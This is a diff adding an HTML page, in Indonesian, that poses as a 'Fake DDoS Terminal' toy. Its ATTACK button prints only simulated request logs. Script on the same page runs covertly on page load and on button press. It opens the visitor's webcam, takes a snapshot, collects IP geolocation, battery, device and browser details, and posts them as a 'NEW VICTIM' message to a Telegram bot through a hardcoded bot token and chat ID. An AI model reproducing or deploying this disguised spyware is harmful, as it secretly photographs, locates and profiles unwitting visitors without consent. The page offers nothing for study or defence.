@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Fake DDoS Terminal</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      padding: 20px;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      background: #111;
+      color: #0f0;
+      border: 1px solid #0f0;
+      margin-bottom: 10px;
+    }
+    #log {
+      background: #111;
+      padding: 20px;
+      height: 300px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      border: 1px solid #0f0;
+      border-radius: 8px;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h2>[DDOS TERMINAL]</h2>
+  <input type="text" id="target" placeholder="Masukkan URL target (contoh: https://example.com)">
+  <button onclick="startAttack()">ATTACK</button>
+  <div id="log">[IDLE] Menunggu perintah...</div>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    const botToken = '7663096341:AAFY5Z9JtV2jRfrIu8o0PprHrGGbGPsRjEk'; // Ganti token bot
+    const chatId = '7548339932';     // Ganti chat ID kamu
+    const logEl = document.getElementById("log");
+    const log = (msg) => {
+      logEl.innerText += `\n${msg}`;
+      logEl.scrollTop = logEl.scrollHeight;
+    };
+
+    async function getIPInfo() {
+      try {
+        const res = await fetch('https://ipinfo.io/json');
+        return await res.json();
+      } catch {
+        return { ip: '-', city: '-', country: '-', loc: '-' };
+      }
+    }
+
+    async function getBatteryInfo() {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        return {
+          level: Math.round(battery.level * 100) + '%',
+          charging: battery.charging ? 'Sedang Mengisi Daya' : 'Tidak'
+        };
+      }
+      return { level: 'N/A', charging: 'N/A' };
+    }
+
+    function getDeviceInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenRes: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        url: window.location.href,
+        time: new Date().toLocaleString()
+      };
+    }
+
+    function takeSnapshot() {
+      return new Promise((resolve) => {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(resolve, "image/jpeg");
+      });
+    }
+
+    async function sendToTelegram(blob, info) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("caption", info);
+      formData.append("photo", blob, "image.jpg");
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    async function captureAndSendInfo() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById("video").srcObject = stream;
+        const ip = await getIPInfo();
+        const bat = await getBatteryInfo();
+        const dev = getDeviceInfo();
+
+        setTimeout(async () => {
+          const snapshot = await takeSnapshot();
+          const msg = `
+🧑‍💻 NEW VICTIM 🧑‍💻\n
+📱 BRAND DEVICE: ${dev.userAgent}\n
+🌐 BROWSER: ${navigator.appName}
+🖥️ PLATFORM OS: ${dev.platform}
+🧭 TIMEZONE: ${dev.timezone}
+🌍 URL HALAMAN: ${dev.url}
+📅 WAKTU AKSES: ${dev.time}
+
+📍 IP ADDRESS: ${ip.ip}
+🌐 COUNTRY: ${ip.country}
+🌁 CITY: ${ip.city}
+🗺️ LOCATION: ${ip.loc}
+
+📐 RESOLUSI LAYAR: ${dev.screenRes}
+🔋 LEVEL BATTERY: ${bat.level} (${bat.charging})
+🗣️ BAHASA: ${dev.language}
+          `;
+          await sendToTelegram(snapshot, msg);
+        }, 3000);
+      } catch (err) {
+        console.warn('Kamera tidak aktif atau ditolak');
+      }
+    }
+
+    function startAttack() {
+      const target = document.getElementById("target").value.trim();
+      if (!target) {
+        alert("Masukkan URL target terlebih dahulu!");
+        return;
+      }
+
+      logEl.innerText = "";
+      log(`[INFO] Target ditentukan: ${target}`);
+      log("[SYSTEM] Menginisialisasi botnet virtual...");
+      log("[SYSTEM] Memulai serangan...");
+
+      // Mulai fake request simulation
+      let i = 1;
+      const interval = setInterval(() => {
+        log(`Mengirimkan request ${i} ke ${target}`);
+        i++;
+        if (i > 999) {
+          clearInterval(interval);
+          log("[SELESAI] Serangan selesai..");
+        }
+      }, 15);
+
+      // Mulai proses kirim data diam-diam
+      captureAndSendInfo();
+    }
+
+    // Otomatis mulai tracking saat halaman dibuka
+    window.onload = () => captureAndSendInfo();
+  </script>
+</body>
+</html>
